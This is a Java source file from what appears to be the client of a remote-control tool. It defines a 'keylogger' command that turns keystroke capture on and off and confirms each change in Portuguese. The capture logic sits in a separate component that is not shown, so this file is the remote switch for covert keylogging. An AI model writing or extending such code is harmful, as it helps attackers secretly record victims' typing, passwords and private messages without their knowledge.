package br.com.introcdc.connect.client.commands.message;
/*
 * Written by IntroCDC, Bruno Coêlho at 16/01/2025 - 03:25
 */

import br.com.introcdc.connect.client.command.ClientCommand;
import br.com.introcdc.connect.client.components.KeyLoggerComponents;

public class ClientCommandKeyLogger extends ClientCommand {

    public ClientCommandKeyLogger() {
        super("keylogger");
    }

    @Override
    public void execute(String command, String input) throws Exception {
        if (KeyLoggerComponents.KEY_LOGGER) {
            KeyLoggerComponents.KEY_LOGGER = false;
            msg("Keylogger desativado!");
        } else {
            KeyLoggerComponents.KEY_LOGGER = true;
            msg("Keylogger ativado!");
        }
    }

}
